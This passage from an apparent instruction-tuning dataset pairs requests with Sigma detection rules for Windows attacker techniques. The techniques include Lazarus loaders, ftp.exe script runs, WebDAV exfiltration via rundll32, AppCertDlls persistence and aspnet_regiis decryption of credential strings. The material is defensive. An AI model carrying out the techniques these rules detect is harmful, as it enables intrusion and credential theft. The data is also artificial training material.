    "instruction": "Build a Sigma rule with the goal of detecting different loaders as described in various threat reports on Lazarus group activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect different loaders as described in various threat reports on Lazarus group activity, you should: Monitor process creation logs on Windows systems for specific command line patterns that indicate potential malicious activity. Specifically, look for instances where `cmd.exe` is executed with a command line containing both '/c' and '-p 0x', which might suggest an attempt to execute commands or scripts in a particular manner often associated with malicious loaders. Additionally, be on the alert for processes that involve file paths pointing to `C:\\ProgramData\\` or `C:\\RECYCLER\\`, as these directories can be used by attackers to discreetly place and execute malicious payloads. Furthermore, pay close attention to the execution of `rundll32.exe` with command lines that include `C:\\ProgramData\\`, paired with file extensions such as `.bin`, `.tmp`, `.dat`, `.io`, `.ini`, and `.db`. These patterns can indicate the use of specific file types for loading malicious code, which is a tactic known in reports on activities by threat groups like Lazarus. The detection of these criteria in the command execution paths should raise alerts due to their critical nature and potential relation to sophisticated threat actor behaviors.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd1:\n        CommandLine|contains|all:\n            - 'cmd.exe /c '\n            - ' -p 0x'\n    selection_cmd2:\n        CommandLine|contains:\n            - 'C:\\ProgramData\\'\n            - 'C:\\RECYCLER\\'\n    selection_rundll1:\n        CommandLine|contains|all:\n            - 'rundll32.exe '\n            - 'C:\\ProgramData\\'\n    selection_rundll2:\n        CommandLine|contains:\n            - '.bin,'\n            - '.tmp,'\n            - '.dat,'\n            - '.io,'\n            - '.ini,'\n            - '.db,'\n    condition: ( selection_cmd1 and selection_cmd2 ) or ( selection_rundll1 and selection_rundll2 )\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd1:\n        CommandLine|contains|all:\n            - 'cmd.exe /c '\n            - ' -p 0x'\n    selection_cmd2:\n        CommandLine|contains:\n            - 'C:\\ProgramData\\'\n            - 'C:\\RECYCLER\\'\n    selection_rundll1:\n        CommandLine|contains|all:\n            - 'rundll32.exe '\n            - 'C:\\ProgramData\\'\n    selection_rundll2:\n        CommandLine|contains:\n            - '.bin,'\n            - '.tmp,'\n            - '.dat,'\n            - '.io,'\n            - '.ini,'\n            - '.db,'\n    condition: ( selection_cmd1 and selection_cmd2 ) or ( selection_rundll1 and selection_rundll2 )\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "different loaders as described in various threat reports on Lazarus group activity",
      "answer": "In order to detect different loaders as described in various threat reports on Lazarus group activity, you should: Monitor process creation logs on Windows systems for specific command line patterns that indicate potential malicious activity. Specifically, look for instances where `cmd.exe` is executed with a command line containing both '/c' and '-p 0x', which might suggest an attempt to execute commands or scripts in a particular manner often associated with malicious loaders. Additionally, be on the alert for processes that involve file paths pointing to `C:\\ProgramData\\` or `C:\\RECYCLER\\`, as these directories can be used by attackers to discreetly place and execute malicious payloads. Furthermore, pay close attention to the execution of `rundll32.exe` with command lines that include `C:\\ProgramData\\`, paired with file extensions such as `.bin`, `.tmp`, `.dat`, `.io`, `.ini`, and `.db`. These patterns can indicate the use of specific file types for loading malicious code, which is a tactic known in reports on activities by threat groups like Lazarus. The detection of these criteria in the command execution paths should raise alerts due to their critical nature and potential relation to sophisticated threat actor behaviors."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of ftp.exe script execution with the \"-s\" flag and any child processes ran by ftp.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of ftp.exe script execution with the \"-s\" flag and any child processes ran by ftp.exe, you should monitor the creation of processes on Windows systems specifically for occurrences where the ftp.exe utility is invoked. Look for any process where the parent process ends with '\\ftp.exe', indicating that a child process is being spawned from ftp.exe. Additionally, keep an eye out for any execution of the ftp.exe utility itself, either by direct invocation or through its original file name. It is particularly noteworthy if the command line includes the '-s:' flag as this flag is used to specify a script to be executed by the ftp.exe application, which could potentially be leveraged in an attack. Watch out for these indicators and capture relevant information such as the command line and the parent image path of the process. While monitoring for such behaviors, bear in mind that there might be legitimate uses of these techniques, although they are not commonly encountered in regular operations. The severity level for these detections is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\ftp.exe'\n    selection_ftp_img:\n        - Image|endswith: '\\ftp.exe'\n        - OriginalFileName: 'ftp.exe'\n    selection_ftp_cli:\n        CommandLine|contains: '-s:'\n    condition: selection_parent or all of selection_ftp_*\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\ftp.exe'\n    selection_ftp_img:\n        - Image|endswith: '\\ftp.exe'\n        - OriginalFileName: 'ftp.exe'\n    selection_ftp_cli:\n        CommandLine|contains: '-s:'\n    condition: selection_parent or all of selection_ftp_*\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of ftp.exe script execution with the \"-s\" flag and any child processes ran by ftp.exe",
      "answer": "In order to detect execution of ftp.exe script execution with the \"-s\" flag and any child processes ran by ftp.exe, you should monitor the creation of processes on Windows systems specifically for occurrences where the ftp.exe utility is invoked. Look for any process where the parent process ends with '\\ftp.exe', indicating that a child process is being spawned from ftp.exe. Additionally, keep an eye out for any execution of the ftp.exe utility itself, either by direct invocation or through its original file name. It is particularly noteworthy if the command line includes the '-s:' flag as this flag is used to specify a script to be executed by the ftp.exe application, which could potentially be leveraged in an attack. Watch out for these indicators and capture relevant information such as the command line and the parent image path of the process. While monitoring for such behaviors, bear in mind that there might be legitimate uses of these techniques, although they are not commonly encountered in regular operations. The severity level for these detections is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie.\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie, which could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server), you should: Monitor Windows process creation logs for instances where \"rundll32.exe\" is initiated, particularly observing if the image ends with '\\rundll32.exe' and matches the original file name 'RUNDLL32.EXE'. Additionally, check the command line for the specific pattern 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'. If both conditions are met, it might indicate potential malicious activity centered around data exfiltration or unauthorized code execution using WebDav. Note that the certainty level for these detections is considered medium, acknowledging there could be cases where such activity is benign and doesn't represent a security threat.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "\"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie.\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).\n",
      "answer": "In order to detect \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie, which could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server), you should: Monitor Windows process creation logs for instances where \"rundll32.exe\" is initiated, particularly observing if the image ends with '\\rundll32.exe' and matches the original file name 'RUNDLL32.EXE'. Additionally, check the command line for the specific pattern 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'. If both conditions are met, it might indicate potential malicious activity centered around data exfiltration or unauthorized code execution using WebDav. Note that the certainty level for these detections is considered medium, acknowledging there could be cases where such activity is benign and doesn't represent a security threat."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the WMIC utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc., you should monitor process creation logs on Windows systems for the execution of the 'wmic.exe' application, specifically looking for instances where the command line includes the term 'computersystem'. This involves checking both the 'Image' path to ensure it ends with '\\wmic.exe' and the 'OriginalFileName' attribute for 'wmic.exe' to accurately identify the utility being used. Additionally, the presence of 'computersystem' within the CommandLine is a key indicator of the utility being used to gather machine information. This approach is necessary to detect potential reconnaissance activities where attackers gather important system information using WMIC. It is important to note that while this behavior might flag legitimate administrative use, such occurrences should be considered in the context of other suspicious activity to minimize false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'computersystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'computersystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc.",
      "answer": "In order to detect execution of the WMIC utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc., you should monitor process creation logs on Windows systems for the execution of the 'wmic.exe' application, specifically looking for instances where the command line includes the term 'computersystem'. This involves checking both the 'Image' path to ensure it ends with '\\wmic.exe' and the 'OriginalFileName' attribute for 'wmic.exe' to accurately identify the utility being used. Additionally, the presence of 'computersystem' within the CommandLine is a key indicator of the utility being used to gather machine information. This approach is necessary to detect potential reconnaissance activities where attackers gather important system information using WMIC. It is important to note that while this behavior might flag legitimate administrative use, such occurrences should be considered in the context of other suspicious activity to minimize false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting filename indicators that contain a specific typo seen used by the Small Sieve malware..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect filename indicators that contain a specific typo seen used by the Small Sieve malware, you should: focus on monitoring Windows file events, specifically looking out for file names that navigate through the user directories and into either the Roaming or Local subfolders within the AppData directory. Key to identifying potential intrusions by the Small Sieve malware is the presence of a distinctive typo where 'Microsoft' is misspelled as 'Microsift'. Additionally, lookout for filenames that culminate precisely with '\\AppData\\Local\\MicrosoftWindowsOutlookDataPlus.txt', as this is a direct indicator of compromise. The criteria for this detection are either the presence of the typo in file paths that traverse through the specified user directories or the specific IOC filename. It is important to consider this rule to have a high level of accuracy with unlikely chances of false positives, thereby necessitating immediate investigation upon alerts. This approach is aligned with identifying tactics and techniques associated with malware deployment and execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_typo_path:\n        TargetFilename|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\'\n        TargetFilename|contains:\n            - '\\Roaming\\'\n            - '\\Local\\'\n    selection_typo_keyword:\n        TargetFilename|contains: 'Microsift'\n    selection_ioc:\n        TargetFilename|endswith: '\\AppData\\Local\\MicrosoftWindowsOutlookDataPlus.txt'\n    condition: all of selection_typo_* or selection_ioc\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_typo_path:\n        TargetFilename|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\'\n        TargetFilename|contains:\n            - '\\Roaming\\'\n            - '\\Local\\'\n    selection_typo_keyword:\n        TargetFilename|contains: 'Microsift'\n    selection_ioc:\n        TargetFilename|endswith: '\\AppData\\Local\\MicrosoftWindowsOutlookDataPlus.txt'\n    condition: all of selection_typo_* or selection_ioc\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "filename indicators that contain a specific typo seen used by the Small Sieve malware.",
      "answer": "In order to detect filename indicators that contain a specific typo seen used by the Small Sieve malware, you should: focus on monitoring Windows file events, specifically looking out for file names that navigate through the user directories and into either the Roaming or Local subfolders within the AppData directory. Key to identifying potential intrusions by the Small Sieve malware is the presence of a distinctive typo where 'Microsoft' is misspelled as 'Microsift'. Additionally, lookout for filenames that culminate precisely with '\\AppData\\Local\\MicrosoftWindowsOutlookDataPlus.txt', as this is a direct indicator of compromise. The criteria for this detection are either the presence of the typo in file paths that traverse through the specified user directories or the specific IOC filename. It is important to consider this rule to have a high level of accuracy with unlikely chances of false positives, thereby necessitating immediate investigation upon alerts. This approach is aligned with identifying tactics and techniques associated with malware deployment and execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675 ..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675, you should focus on monitoring antivirus logs specifically for files created or modified in the `C:\\Windows\\System32\\spool\\drivers\\x64\\` directory. This path is critical because it's commonly exploited by attackers aiming to leverage the Print Spooler vulnerabilities to execute malicious code remotely on a Windows system. \n\nIt's crucial to watch for any activity involving the creation or modification of files in this directory without immediately flagging files that have been submitted to Symantec for analysis (identified by mentions such as \"File submitted to Symantec\"), as these might still be under investigation and could result in false positives. Nonetheless, since these false positives are considered unlikely or are pending further analysis by a Protection Service for Platforms (PSP), any hit outside of this context should be taken with utmost seriousness.\n\nFor effective detection, ensure to log and scrutinize the signature of the detected file, its filename, and the computer name which reported the activity. By concentrating on these details, you can identify and respond to potential exploitation of these vulnerabilities more swiftly. Given the critical nature of these vulnerabilities and the method of attack, this detection mechanism is paramount in defending against unauthorized remote code execution that capitalizes on the Windows Print Spooler vulnerabilities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: antivirus\ndetection:\n    selection:\n        Filename|contains: 'C:\\Windows\\System32\\spool\\drivers\\x64\\'\n    keywords:\n        - 'File submitted to Symantec' # symantec fp, pending analysis, more generic\n    condition: selection and not keywords\nfields:\n    - Signature\n    - Filename\n    - ComputerName\nfalsepositives:\n    - Unlikely, or pending PSP analysis\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: antivirus\ndetection:\n    selection:\n        Filename|contains: 'C:\\Windows\\System32\\spool\\drivers\\x64\\'\n    keywords:\n        - 'File submitted to Symantec' # symantec fp, pending analysis, more generic\n    condition: selection and not keywords\nfields:\n    - Signature\n    - Filename\n    - ComputerName\nfalsepositives:\n    - Unlikely, or pending PSP analysis\nlevel: critical\n",
      "question": "suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675 .",
      "answer": "In order to detect the suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675, you should focus on monitoring antivirus logs specifically for files created or modified in the `C:\\Windows\\System32\\spool\\drivers\\x64\\` directory. This path is critical because it's commonly exploited by attackers aiming to leverage the Print Spooler vulnerabilities to execute malicious code remotely on a Windows system. \n\nIt's crucial to watch for any activity involving the creation or modification of files in this directory without immediately flagging files that have been submitted to Symantec for analysis (identified by mentions such as \"File submitted to Symantec\"), as these might still be under investigation and could result in false positives. Nonetheless, since these false positives are considered unlikely or are pending further analysis by a Protection Service for Platforms (PSP), any hit outside of this context should be taken with utmost seriousness.\n\nFor effective detection, ensure to log and scrutinize the signature of the detected file, its filename, and the computer name which reported the activity. By concentrating on these details, you can identify and respond to potential exploitation of these vulnerabilities more swiftly. Given the critical nature of these vulnerabilities and the method of attack, this detection mechanism is paramount in defending against unauthorized remote code execution that capitalizes on the Windows Print Spooler vulnerabilities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting files dropped by Winnti as described in RedMimicry Winnti playbook.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect files dropped by Winnti as described in RedMimicry Winnti playbook, you should monitor Windows file events for the creation or modification of specific files. Look out for files with names that conclude with '\\gthread-3.6.dll', '\\sigcmm-2.4.dll', or '\\Windows\\Temp\\tmp.bat'. The detection of these files is crucial as their presence may indicate a Winnti infection, a notorious threat group known for its cyber espionage tactics and techniques. It's important to be vigilant as there might be unknown cases where these indicators do not signify a threat, however, given the context, such instances are likely to be rare. This activity is rated at a high level of concern due to the potential implications and association with known malicious endeavours.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\gthread-3.6.dll'\n            - '\\sigcmm-2.4.dll'\n            - '\\Windows\\Temp\\tmp.bat'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\gthread-3.6.dll'\n            - '\\sigcmm-2.4.dll'\n            - '\\Windows\\Temp\\tmp.bat'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "files dropped by Winnti as described in RedMimicry Winnti playbook",
      "answer": "In order to detect files dropped by Winnti as described in RedMimicry Winnti playbook, you should monitor Windows file events for the creation or modification of specific files. Look out for files with names that conclude with '\\gthread-3.6.dll', '\\sigcmm-2.4.dll', or '\\Windows\\Temp\\tmp.bat'. The detection of these files is crucial as their presence may indicate a Winnti infection, a notorious threat group known for its cyber espionage tactics and techniques. It's important to be vigilant as there might be unknown cases where these indicators do not signify a threat, however, given the context, such instances are likely to be rare. This activity is rated at a high level of concern due to the potential implications and association with known malicious endeavours."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process creation events that use the Sysnative folder (common for CobaltStrike spawns).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect process creation events that use the Sysnative folder (common for CobaltStrike spawns), you should: Monitor process creation logs in Windows environments, specifically focusing on instances where the command line starts with 'C:\\Windows\\Sysnative\\'. This detection method is crucial for identifying suspicious activity associated with CobaltStrike or similar threats, as attackers often leverage the Sysnative directory to execute 32-bit applications on 64-bit systems in an effort to evade detection. Always include both the command line and parent command line in the monitoring process to enhance context understanding. Be aware that there might be legitimate uses of this technique, although they are typically unknown, thus requiring a medium level of scrutiny when such activities are detected.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    sysnative:\n        CommandLine|startswith: 'C:\\Windows\\Sysnative\\'\n    condition: sysnative\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    sysnative:\n        CommandLine|startswith: 'C:\\Windows\\Sysnative\\'\n    condition: sysnative\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "process creation events that use the Sysnative folder (common for CobaltStrike spawns)",
      "answer": "In order to detect process creation events that use the Sysnative folder (common for CobaltStrike spawns), you should: Monitor process creation logs in Windows environments, specifically focusing on instances where the command line starts with 'C:\\Windows\\Sysnative\\'. This detection method is crucial for identifying suspicious activity associated with CobaltStrike or similar threats, as attackers often leverage the Sysnative directory to execute 32-bit applications on 64-bit systems in an effort to evade detection. Always include both the command line and parent command line in the monitoring process to enhance context understanding. Be aware that there might be legitimate uses of this technique, although they are typically unknown, thus requiring a medium level of scrutiny when such activities are detected."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an executable that isn't dropbox but communicates with the Dropbox API.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an executable that isn't Dropbox but communicates with the Dropbox API, you should monitor network connections on Windows systems. Observe for any network connections initiated towards the destination hostnames that end with 'api.dropboxapi.com' or 'content.dropboxapi.com'. It's crucial to apply a filter to exclude situations where the process image path contains '\\Dropbox', as this likely indicates legitimate Dropbox software activity. Attention should be given to any matches that are not filtered out, as these could represent suspicious activities, possibly indicating misuse of the Dropbox API to exfiltrate data, disguise malicious traffic, or other unauthorized actions. Be aware of potential false positives, which might occur if there's legitimate usage of the Dropbox API by tools not initially considered during the rule creation. Assign a high level of scrutiny to such detections, given the potential security implications tied to the unauthorized use of cloud services for malicious intent, associated with tactics and techniques like exfiltration over alternative protocol.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith:\n            - 'api.dropboxapi.com'\n            - 'content.dropboxapi.com'\n    filter:\n        Image|contains: '\\Dropbox'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of the API with a tool that the author wasn't aware of\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith:\n            - 'api.dropboxapi.com'\n            - 'content.dropboxapi.com'\n    filter:\n        Image|contains: '\\Dropbox'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of the API with a tool that the author wasn't aware of\nlevel: high\n",
      "question": "an executable that isn't dropbox but communicates with the Dropbox API",
      "answer": "In order to detect an executable that isn't Dropbox but communicates with the Dropbox API, you should monitor network connections on Windows systems. Observe for any network connections initiated towards the destination hostnames that end with 'api.dropboxapi.com' or 'content.dropboxapi.com'. It's crucial to apply a filter to exclude situations where the process image path contains '\\Dropbox', as this likely indicates legitimate Dropbox software activity. Attention should be given to any matches that are not filtered out, as these could represent suspicious activities, possibly indicating misuse of the Dropbox API to exfiltrate data, disguise malicious traffic, or other unauthorized actions. Be aware of potential false positives, which might occur if there's legitimate usage of the Dropbox API by tools not initially considered during the rule creation. Assign a high level of scrutiny to such detections, given the potential security implications tied to the unauthorized use of cloud services for malicious intent, associated with tactics and techniques like exfiltration over alternative protocol."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\nby causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activities related to abusing the AppCertDLLs value in the Windows Registry for obtaining persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer, you should focus on monitoring registry events within Windows environments. Specifically, pay attention to events that involve the registry key `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls`. This includes direct modifications to the target object itself or cases where the key might be renamed, a technique which could be observed in new name entries such as `HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls`.\n\nFor effective monitoring, track the Event ID, the image name involved in the event, the target object, and any new name it might have been given. Despite the complexity of differentiating between legitimate and malicious changes to this registry key, staying vigilant about these modifications is crucial, as there are no well-defined patterns of benign alterations to this specific key, making any changes suspicious. \n\nThis approach aligns with techniques identified for persistence and privilege escalation where attackers leverage the Windows Registry, particularly the modification or manipulation of the `AppCertDlls` value to load malicious DLLs. Continuously monitoring for alterations or renaming of this registry key serves as a critical step in early detection of potential compromise designed to maintain persistent access or escalate privileges within an affected system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        # Sysmon gives us HKLM\\SYSTEM\\CurrentControlSet\\.. if ControlSetXX is the selected one\n        - TargetObject: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls'\n        # key rename\n        - NewName: 'HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        # Sysmon gives us HKLM\\SYSTEM\\CurrentControlSet\\.. if ControlSetXX is the selected one\n        - TargetObject: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls'\n        # key rename\n        - NewName: 'HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\nby causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n",
      "answer": "In order to detect activities related to abusing the AppCertDLLs value in the Windows Registry for obtaining persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer, you should focus on monitoring registry events within Windows environments. Specifically, pay attention to events that involve the registry key `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls`. This includes direct modifications to the target object itself or cases where the key might be renamed, a technique which could be observed in new name entries such as `HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls`.\n\nFor effective monitoring, track the Event ID, the image name involved in the event, the target object, and any new name it might have been given. Despite the complexity of differentiating between legitimate and malicious changes to this registry key, staying vigilant about these modifications is crucial, as there are no well-defined patterns of benign alterations to this specific key, making any changes suspicious. \n\nThis approach aligns with techniques identified for persistence and privilege escalation where attackers leverage the Windows Registry, particularly the modification or manipulation of the `AppCertDlls` value to load malicious DLLs. Continuously monitoring for alterations or renaming of this registry key serves as a critical step in early detection of potential compromise designed to maintain persistent access or escalate privileges within an affected system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of aspnet_regiis to decrypt Microsoft IIS connection strings, where an attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command, you should: Monitor for the creation of processes on Windows systems that involve the aspnet_regiis.exe file, particularly when the command line executed includes both 'connectionStrings' and '-pdf'. This detection is critical as it identifies attempts to decrypt and access sensitive information typically found in Microsoft IIS connection strings, which could include service account passwords. Flagging any instances where these criteria are met is crucial since this activity is highly suspicious and often indicative of an attacker exploiting access to a Microsoft IIS web server to extract sensitive data. Although the possibility of false positives is noted as unknown, the high level of concern warrants close observation of events matching these conditions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith: '\\aspnet_regiis.exe'\n        - OriginalFileName: 'aspnet_regiis.exe'\n    selection_args:\n        CommandLine|contains|all:\n            - 'connectionStrings'\n            - ' -pdf'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith: '\\aspnet_regiis.exe'\n        - OriginalFileName: 'aspnet_regiis.exe'\n    selection_args:\n        CommandLine|contains|all:\n            - 'connectionStrings'\n            - ' -pdf'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.",
